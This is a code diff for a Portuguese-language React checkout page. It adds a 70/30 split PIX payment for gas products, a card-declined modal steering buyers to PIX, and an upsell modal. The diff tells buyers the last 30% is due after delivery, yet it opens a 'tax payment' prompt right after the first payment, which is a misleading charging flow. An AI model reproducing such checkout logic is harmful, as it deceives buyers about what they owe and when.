+                        <div className="space-y-1 text-xs text-gray-700">
+                          <div className="flex justify-between">
+                            <span>🔵 Pagando agora (70%):</span>
+                            <strong className="text-blue-600">{formatPrice(getPaymentAmount())}</strong>
+                          </div>
+                          <div className="flex justify-between">
+                            <span>⚪ Restante após entrega (30%):</span>
+                            <strong className="text-gray-600">{formatPrice(getTaxPaymentAmount())}</strong>
+                          </div>
+                          <div className="flex justify-between border-t pt-1 mt-1">
+                            <span>💵 Total:</span>
+                            <strong className="text-green-600">{formatPrice(getTotalPrice() - pixDiscount)}</strong>
+                          </div>
+                        </div>
+                      </div>
+                    )}
+
+                    {requiresSplitPayment() && firstPaymentCompleted && (
+                      <div className="bg-orange-50 border border-orange-200 rounded-lg p-3 mb-3">
+                        <p className="text-sm font-bold text-orange-800 mb-2">💰 Pagamento dos Impostos (30%)</p>
+                        <div className="space-y-1 text-xs text-gray-700">
+                          <div className="flex justify-between">
+                            <span>✅ Já pago (70%):</span>
+                            <strong className="text-green-600">{formatPrice(getFirstPaymentAmount())}</strong>
+                          </div>
+                          <div className="flex justify-between">
+                            <span>🔵 Pagando agora (30%):</span>
+                            <strong className="text-orange-600">{formatPrice(getTaxPaymentAmount())}</strong>
+                          </div>
+                          <div className="flex justify-between border-t pt-1 mt-1">
+                            <span>💵 Total:</span>
+                            <strong className="text-green-600">{formatPrice(getTotalPrice() - pixDiscount)}</strong>
+                          </div>
+                        </div>
+                      </div>
+                    )}
 
                     {/* QR Code - Mostrar apenas se pagamento ainda não foi confirmado */}
                     {pixData.pix?.qrcode && pixData.status !== "paid" && (
@@ -3129,13 +3544,20 @@ export default function CheckoutPage() {
                                   paidAt: new Date().toISOString()
                                 }))
                                 
-                                // Se for gás, mostrar modal de impostos
+                                // Se for gás, verificar se é primeiro ou segundo pagamento
                                 if (requiresSplitPayment() && !firstPaymentCompleted) {
                                   console.log('✅ Primeiro pagamento simulado! Mostrando modal de impostos...')
                                   setFirstPaymentCompleted(true)
                                   setShowTaxPaymentModal(true)
                                 } else {
                                   console.log('✅ Pagamento simulado como PAID!')
+                                  
+                                  // Pagamento completo (100% ou segundo pagamento de 30%)
+                                  console.log('🎉 Pagamento 100% completo! Mostrando modal de upsell...')
+                                  setTimeout(() => {
+                                    console.log('🍺 [SIMULAÇÃO] Abrindo modal de upsell...')
+                                    setShowUpsellModal(true)
+                                  }, 1000)
                                 }
                               }}
                               className="w-full bg-red-600 hover:bg-red-700 text-white font-bold py-2 px-4 rounded-lg"
@@ -3572,9 +3994,23 @@ export default function CheckoutPage() {
                 <div className="space-y-1 text-sm text-gray-600">
                   <p><strong>Produto:</strong> {productName}</p>
                   <p><strong>Endereço:</strong> {addressData?.logradouro}, {customerData.number}</p>
-                  <p className="text-lg font-bold text-gray-800 mt-2">
-                    Total: {formatCurrency(getTotalPrice())}
-                  </p>
+                  {isGasProduct() ? (
+                    <>
+                      <p className="text-sm text-gray-600 mt-2">
+                        <strong>Valor total:</strong> {formatCurrency(getTotalPrice())}
+                      </p>
+                      <p className="text-lg font-bold text-blue-600 mt-1">
+                        Cobrança inicial (70%): {formatCurrency(Math.round(getTotalPrice() * 0.70))}
+                      </p>
+                      <p className="text-xs text-gray-500">
+                        Restante (30%): {formatCurrency(Math.round(getTotalPrice() * 0.30))} após entrega
+                      </p>
+                    </>
+                  ) : (
+                    <p className="text-lg font-bold text-gray-800 mt-2">
+                      Total: {formatCurrency(getTotalPrice())}
+                    </p>
+                  )}
                 </div>
               </div>
 
@@ -3609,13 +4045,108 @@ export default function CheckoutPage() {
         </div>
       )}
 
-      {/* Loading Fullscreen */}
+      {/* Loading Fullscreen com Mensagens Progressivas */}
       {cardSubmitting && (
         <div className="fixed inset-0 bg-black/70 backdrop-blur-md flex items-center justify-center z-[60]">
           <div className="bg-white rounded-2xl p-8 max-w-sm w-full mx-4 text-center">
             <div className="w-16 h-16 border-4 border-blue-600 border-t-transparent rounded-full animate-spin mx-auto mb-4"></div>
-            <h3 className="text-xl font-bold text-gray-800 mb-2">Processando pagamento...</h3>
-            <p className="text-sm text-gray-600">Aguarde um momento</p>
+            <h3 className="text-xl font-bold text-gray-800 mb-2">{cardLoadingMessage}</h3>
+            <p className="text-sm text-gray-600">
+              {cardLoadingMessage.includes('Infelizmente') 
+                ? 'Mas temos uma solução melhor para você!' 
+                : 'Aguarde um momento'}
+            </p>
+          </div>
+        </div>
+      )}
+
+      {/* Modal de Erro do Cartão - Oferece PIX */}
+      {showPixDiscountModal && (
+        <div className="fixed inset-0 bg-black/70 backdrop-blur-sm flex items-center justify-center z-[70] p-3 sm:p-4 overflow-y-auto">
+          <div className="bg-white rounded-xl sm:rounded-2xl max-w-md w-full shadow-2xl my-4 max-h-[95vh] overflow-y-auto">
+            {/* Header Compacto */}
+            <div className="bg-gradient-to-r from-red-500 to-red-600 text-white p-4 sm:p-5 rounded-t-xl sm:rounded-t-2xl">
+              <div className="flex items-center justify-center gap-2 mb-1">
+                <X className="w-6 h-6" />
+                <h3 className="text-lg sm:text-xl font-bold">Cartão Não Aprovado</h3>
+              </div>
+              <p className="text-center text-red-100 text-xs sm:text-sm">
+                Tente com PIX e ganhe desconto!
+              </p>
+            </div>
+
+            {/* Content Compacto */}
+            <div className="p-4 sm:p-5 space-y-3">
+              {/* Oferta PIX Compacta */}
+              <div className="bg-gradient-to-br from-green-50 to-emerald-50 border-2 border-green-300 rounded-lg p-3 sm:p-4">
+                <div className="flex items-start gap-2 mb-3">
+                  <CheckCircle className="w-5 h-5 text-green-600 flex-shrink-0 mt-0.5" />
+                  <div className="flex-1">
+                    <h4 className="font-bold text-green-800 text-sm sm:text-base mb-1">
+                      🎉 10% OFF no PIX!
+                    </h4>
+                    <p className="text-xs text-gray-700">
+                      Pague com PIX e economize <strong className="text-green-600">10%</strong>
+                    </p>
+                  </div>
+                </div>
+                
+                {/* Valores Compactos */}
+                <div className="bg-white rounded-lg p-3 space-y-2">
+                  <div className="flex justify-between items-center text-xs sm:text-sm">
+                    <span className="text-gray-600">Valor original:</span>
+                    <span className="font-semibold line-through text-gray-500">{formatPrice(getTotalPrice())}</span>
+                  </div>
+                  <div className="flex justify-between items-center pt-2 border-t border-gray-200">
+                    <span className="text-sm font-bold text-green-700">Com PIX:</span>
+                    <span className="text-xl sm:text-2xl font-bold text-green-600">{formatPrice(getTotalPrice() - pixDiscount)}</span>
+                  </div>
+                  <div className="text-center pt-2 border-t border-gray-200">
+                    <p className="text-xs text-gray-600">
+                      💰 Economia: <strong className="text-green-600">{formatPrice(pixDiscount)}</strong>
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              {/* Benefícios Compactos */}
+              <div className="bg-blue-50 border border-blue-200 rounded-lg p-2">
+                <div className="flex flex-wrap items-center justify-center gap-1 text-[10px] sm:text-xs text-gray-700">
+                  <span>✅ Instantâneo</span>
+                  <span>•</span>
+                  <span>✅ Aprovação imediata</span>
+                  <span>•</span>
+                  <span>✅ Entrega rápida</span>
+                </div>
+              </div>
+
+              {/* Botão Compacto */}
+              <button
+                onClick={async () => {
+                  console.log('🎯 Botão PIX clicado!')
+                  setShowPixDiscountModal(false)
+                  setCardFailed(false)
+                  console.log('📍 Avançando para Step 3 e gerando PIX...')
+                  setStep(3)
+                  
+                  // Aguardar renderização do Step 3
+                  await new Promise(resolve => setTimeout(resolve, 100))
+                  
+                  // Gerar PIX com desconto de 10% já aplicado
+                  // A função generatePix já vai calcular 70% se for gás
+                  console.log('💰 Desconto PIX aplicado:', pixDiscount)
+                  console.log('🔥 Gerando PIX com valor já descontado...')
+                  await generatePix(false)
+                }}
+                className="w-full bg-gradient-to-r from-green-600 to-green-700 hover:from-green-700 hover:to-green-800 text-white font-bold py-3 sm:py-3.5 px-4 rounded-lg shadow-lg hover:shadow-xl transition-all duration-200 text-sm sm:text-base"
+              >
+                💳 Pagar com PIX (10% OFF)
+              </button>
+
+              <p className="text-[10px] sm:text-xs text-center text-gray-500 leading-tight">
+                O PIX será gerado automaticamente
+              </p>
+            </div>
           </div>
         </div>
       )}
